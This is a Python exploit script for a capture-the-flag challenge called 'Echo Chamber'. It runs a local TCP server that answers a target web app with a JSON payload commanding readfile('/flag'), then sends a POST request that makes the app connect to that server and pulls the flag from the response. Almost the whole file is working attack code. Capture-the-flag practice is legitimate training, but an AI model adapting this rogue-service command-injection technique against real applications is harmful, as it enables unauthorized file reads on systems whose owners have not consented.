#!/usr/bin/env python3
"""
Echo Chamber - Working TCP Self-Connect Exploit
Author: Shadow PB
"""

import requests
import json
import time
import socket
import threading

def create_echo_server(port):
    """Create a simple echo server that responds with our payload"""
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('127.0.0.1', port))
        server_socket.listen(1)
        server_socket.settimeout(5)
        
        print(f"[*] Echo server listening on port {port}")
        
        conn, addr = server_socket.accept()
        print(f"[*] Connection from {addr}")
        
        # Read the incoming data (JSON payload)
        data = conn.recv(1024).decode()
        print(f"[*] Received: {data}")
        
        # Send back our malicious payload
        response = '{"signal":"Echo","command":"readfile(\'/flag\');"}'
        conn.send(response.encode())
        print(f"[*] Sent response: {response}")
        
        conn.close()
        server_socket.close()
        return True
        
    except Exception as e:
        print(f"[-] Echo server error: {e}")
        return False

def exploit_echo_chamber():
    """Exploit the Echo Chamber challenge"""
    
    print("[*] Starting Echo Chamber exploit...")
    
    # Start echo server in a separate thread
    echo_port = 8081
    server_thread = threading.Thread(target=create_echo_server, args=(echo_port,))
    server_thread.daemon = True
    server_thread.start()
    
    time.sleep(1)  # Give server time to start
    
    # Send request that will trigger connection to our echo server
    payload = {"test": "data"}
    json_payload = json.dumps(payload)
    
    try:
        # Use scanner value that will include our echo port
        url = f"http://localhost:8080/?scanner={echo_port}"
        
        response = requests.post(
            url,
            data=json_payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        
        # Check if we got the flag instead of PHP source
        if 'DSCCTF{' in response.text:
            print(f"[+] SUCCESS! Flag found:")
            # Extract just the flag
            flag_start = response.text.find('DSCCTF{')
            flag_end = response.text.find('}', flag_start) + 1
            flag = response.text[flag_start:flag_end]
            print(f"[+] {flag}")
            return True
        else:
            print("[-] No flag in response")
            print(response.text[:200])
            
    except Exception as e:
        print(f"[-] Request failed: {e}")
    
    return False

def main():
    print("=" * 60)
    print("Echo Chamber Challenge Exploit")
    print("Author: Shadow PB")
    print("=" * 60)
    
    success = exploit_echo_chamber()
    
    if not success:
        print("\n[!] Exploit failed. This demonstrates the complexity of TCP self-connect.")
        print("[!] In a real scenario, timing and network conditions matter greatly.")

if __name__ == "__main__":
    main()